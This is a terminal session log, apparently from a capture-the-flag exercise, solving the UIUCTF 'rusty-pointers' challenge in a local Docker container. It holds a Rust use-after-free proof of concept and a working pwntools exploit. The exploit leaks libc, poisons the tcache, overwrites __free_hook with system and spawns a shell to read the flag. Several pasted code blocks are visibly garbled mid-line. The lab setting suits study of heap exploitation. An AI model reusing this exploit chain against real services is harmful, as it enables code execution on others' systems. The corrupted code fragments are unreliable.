@@ -1,0 +1,315 @@
+Desafio Rusty-Pointer Doc Concluido
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$ sudo docker exec -it rusty-pointers-dist bash
+pwn@fe371b477eb1:/usr/src/pwn$ rustc --version
+rustc 1.75.0 (82e1608df 2023-12-21) (built from a source tarball)
+pwn@fe371b477eb1:/usr/src/pwn$ ldd --version
+ldd (Ubuntu GLIBC 2.31-0ubuntu9.17) 2.31
+Copyright (C) 2020 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.  There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+Written by Roland McGrath and Ulrich Drepper.
+pwn@fe371b477eb1:/usr/src/pwn$ cat << 'EOF' > /tmp/poc_uaf.rs
+> const LEN: usize = 64;
+> const S: &&() = &&();
+> #[inline(never)]
+> fn get_ptr<'a, 'b, T: ?Sized>(x: &'a mut T) -> &'b mut T {
+>     fn ident<'a, 'b, T: ?Sized>(
+>         _val_a: &'a &'b (),
+>         val_b: &'b mut T,
+>     ) -> &'a mut T {
+>         val_b
+>     }
+>     let f: fn(_, &'a mut T) -> &'b mut T = ident;
+>     f(S, x)
+> }
+'static mut [u8; LEN] {
+    let >
+> #[inline(never)]
+> fn get_rule() -> &'static mut [u8; LEN] {
+>     let mut buffer = Box::new([0; LEN]);
+>     return get_ptr(&mut buffer);
+> }
+>
+> fn main() {
+>     let dangling = get_rule();
+>     println!("Apos drop do Box (heap livre): {:x?}", &dangling[..16]);
+>
+>     let _nova_alocacao = Box::new([0x41u8; LEN]);
+>     println!("Apos nova alocacao de 64 bytes: {:x?}", &dangling[..16]);
+> }
+> EOF
+pwn@fe371b477eb1:/usr/src/pwn$ rustc /tmp/poc_uaf.rs -o /tmp/poc_uaf && / tmp/pov_uaf
+bash: /: Is a directory
+pwn@fe371b477eb1:/usr/src/pwn$ rustc /tmp/poc_uaf.rs -o /tmp/poc_uaf && /tmp
+/pov_uaf
+bash: /tmp/pov_uaf: No such file or directory
+pwn@fe371b477eb1:/usr/src/pwn$ rustc /tmp/poc_uaf.rs -o /tmp/poc_uaf && /tmp/poc_uaf
+Apos drop do Box (heap livre): [0, 0, 0, 0, 0, 0, 0, 0, 10, 40, 6e, 5c, 3e, 63, 0, 0]
+Apos nova alocacao de 64 bytes: [41, 41, 41, 41, 41, 41, 41, 41, 41, 41, 41, 41, 41, 41, 41, 41]
+pwn@fe371b477eb1:/usr/src/pwn$ exit
+exit
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$ nc 127.0.0.1:1337
+nc: missing port number
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$ nc 127.0.0.1 1337
+1. Create a Rule or Note
+2. Delete a Rule or Note
+3. Read a Rule or Note
+4. Edit a Rule or Note
+5. Make a Law
+6. Exit
+> Exit
+^C
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$ cp solve.py solve_local.py
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$ sed -i "s/remote('rusty-pointers.chal.uiuc.tf', 1337, ssl=True)/remote('127.0.0.1', 1337)/" solve_local.py
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$ python3 solve_local.py
+[+] Opening connection to 127.0.0.1 on port 1337: Done
+[*] '/home/MainUser/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers/challenge/dist/libc-2.31.so'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+libc base:  0x7a4cc7a8a000
+hook: 0x7a4cc7c78e48
+/home/MainUser/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers/solve_local.py:87: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  p.sendline(dat)
+[*] Switching to interactive mode
+1. Create a Rule or Note
+2. Delete a Rule or Note
+3. Read a Rule or Note
+4. Edit a Rule or Note
+5. Make a Law
+6. Exit
+> [*] Got EOF while reading in interactive
+$ sudo docker logs rusty-pointers-dist
+$ cat flag.txt
+$ sudo docker logs rusty-pointers-dist
+[*] Closed connection to 127.0.0.1 port 1337
+[*] Got EOF while sending in interactive
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$ cat << 'EOF' > solve_local.py
+#!/usr/bin/env python3
+from pwn import *
+
+HOST = "127.0.0.1"
+PORT = 1337
+
+LIBC = ELF("./challenge/dist/libc-2.31.so")
+p = remote(HOST, PORT)
+
+def mt():
+    p.recvuntil(b"> ")
+
+def snd(x):
+    p.sendline(str(x).encode())
+
+def make_rule():
+    mt()
+    snd(1)
+    mt()
+    snd(1)
+
+def make_note():
+    mt()
+    snd(1)
+    mt()
+    snd(2)
+
+def del_note(i):
+    mt()
+    snd(2)
+    mt()
+    snd(2)
+    mt()
+    snd(i)
+
+def ed_rule(i, dat):
+    mt()
+    snd(4)
+    mt()
+EOFnteractive()t flag.txt")0 e libera explicitamente para disparar system("/
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$ cd ~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$ sudo docker ps
+[sudo] password for MainUser:
+CONTAINER ID   IMAGE                 COMMAND                  CREATED       STATUS       PORTS                                         NAMES
+fe371b477eb1   rusty-pointers-dist   "/bin/sh -c 'socat -…"   2 hours ago   Up 2 hours   0.0.0.0:1337->1337/tcp, [::]:1337->1337/tcp   rusty-pointers-dist
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$ python solve_local.py
+[*] '/home/MainUser/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers/challenge/dist/libc-2.31.so'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+[+] Opening connection to 127.0.0.1 on port 1337: Done
+Traceback (most recent call last):
+  File "/home/MainUser/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers/solve_local.py", line 61, in <module>
+    leak = make_law()
+           ^^^^^^^^^^
+  File "/home/MainUser/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers/solve_local.py", line 57, in make_law
+    rsp = int(p.recvline().decode().split(", "), 16)
+          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+TypeError: int() can't convert non-string with explicit base
+[*] Closed connection to 127.0.0.1 port 1337
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$ nano solve_local.py
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$ python3 solve_local.py
+[*] '/home/MainUser/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers/challenge/dist/libc-2.31.so'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+[+] Opening connection to 127.0.0.1 on port 1337: Done
+Traceback (most recent call last):
+  File "/home/MainUser/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers/solve_local.py", line 61, in <module>
+    leak = make_law()
+           ^^^^^^^^^^
+  File "/home/MainUser/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers/solve_local.py", line 57, in make_law
+    rsp = int(p.recvline().decode().split(", "), 16)
+          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+TypeError: int() can't convert non-string with explicit base
+[*] Closed connection to 127.0.0.1 port 1337
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$ cd ~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$ cd ~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$ cat << 'EOF' > solve_local.py
+> #!/usr/bin/env python3
+frcat << 'EOF' > solve_local.py
+  #!/usr/bin/env python3
+frcat << 'EOF' > solve_local.py
+> cat << 'EOF' > solve_local.py
+#!/usr/bin/env python3
+from pwn import *
+
+HOST = "127.0.0.1"
+PORT = 1337
+
+libc = ELF("./challenge/dist/libc-2.31.so")
+io = remote(HOST, PORT)
+
+def create_rule():
+    io.sendlineafter(b"> ", b"1")
+    io.sendlineafter(b"> ", b"1")
+
+def create_note():
+    io.sendlineafter(b"> ", b"1")
+    io.sendlineafter(b"> ", b"2")
+
+def delete_note(idx):
+    io.sendlineafter(b"> ", b"2")
+    io.sendlineafter(b"> ", b"2")
+    io.sendlineafter(b"> ", str(idx).encode())
+
+def edit_rule(idx, data):
+    io.sendlineafter(b"> ", b"4")
+    io.sendlineafter(b"> ", b"1")
+    io.sendlineafter(b"> ", str(idx).encode())
+    io.sendafter(b"> ", data.ljust(64, b"\x00"))
+
+def edit_note(idx, data):
+    io.sendlineafter(b"> ", b"4")
+    io.sendlineafter(b"> ", b"2")
+    io.sendlineafter(b"> ", str(idx).encode())
+    io.sendafter(b"> ", data.ljust(64, b"\x00"))
+
+def make_law():
+    io.sendlineafter(b"> ", b"5")
+    return int(io.recvuntil(b",", drop=True), 16)
+
+libc_leak = make_law()
+libc.address = libc_leak - 0x1ecbe0
+EOFinteractive()t flag.txt")x(system)}")}")}")
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentac(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$ cat << 'EOF' > solve_local.py
+#!/usr/bin/env python3
+from pwn import *
+
+HOST = "127.0.0.1"
+PORT = 1337
+libc = ELF("./challenge/dist/libc-2.31.so")
+io = remote(HOST, PORT)
+
+def create_rule():
+    io.sendlineafter(b"> ", b"1")
+    io.sendlineafter(b"> ", b"1")
+
+def create_note():
+    io.sendlineafter(b"> ", b"1")
+    io.sendlineafter(b"> ", b"2")
+EOF
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$ cat << 'EOF' >> solve_local.py
+
+def delete_note(idx):
+    io.sendlineafter(b"> ", b"2")
+    io.sendlineafter(b"> ", b"2")
+    io.sendlineafter(b"> ", str(idx).encode())
+
+def edit_rule(idx, data):
+    io.sendlineafter(b"> ", b"4")
+    io.sendlineafter(b"> ", b"1")
+    io.sendlineafter(b"> ", str(idx).encode())
+    io.sendafter(b"> ", data.ljust(64, b"\x00"))
+EOF
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$ cat << 'EOF' >> solve_local.py
+
+def edit_note(idx, data):
+    io.sendlineafter(b"> ", b"4")
+    io.sendlineafter(b"> ", b"2")
+    io.sendlineafter(b"> ", str(idx).encode())
+    io.sendafter(b"> ", data.ljust(64, b"\x00"))
+
+def make_law():
+    io.sendlineafter(b"> ", b"5")
+    return int(io.recvuntil(b",", drop=True), 16)
+EOF
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$ cat << 'EOF' >> solve_local.py
+
+libc_leak = make_law()
+libc.address = libc_leak - 0x1ecbe0
+free_hook = libc.sym["__free_hook"]
+system = libc.sym["system"]
+
+for _ in range(4):
+    create_note()
+delete_note(3)
+delete_note(2)
+delete_note(1)
+delete_note(0)
+EOF
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$ cat << 'EOF' >> solve_local.py
+
+create_rule()
+edit_rule(0, p64(free_hook))
+create_note()
+create_note()
+edit_note(1, p64(system))
+edit_note(0, b"/bin/sh\x00")
+delete_note(0)
+io.sendline(b"cat flag.txt")
+io.interactive()
+EOF
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$ tail -n 5 solve_local.py
+edit_note(1, p64(system))
+edit_note(0, b"/bin/sh\x00")
+delete_note(0)
+io.sendline(b"cat flag.txt")
+io.interactive()
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$ .venv/bin/python solve_local.py
+[*] '/home/MainUser/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers/challenge/dist/libc-2.31.so'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+[+] Opening connection to 127.0.0.1 on port 1337: Done
+[*] Switching to interactive mode
+uiuctf{who_knew_if_my_pointers_lived_forever_they_would_rust???}[*] Got EOF while reading in interactive
+$ id
+$
+[*] Interrupted
+[*] Closed connection to 127.0.0.1 port 1337
+(.venv) User:~/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers$
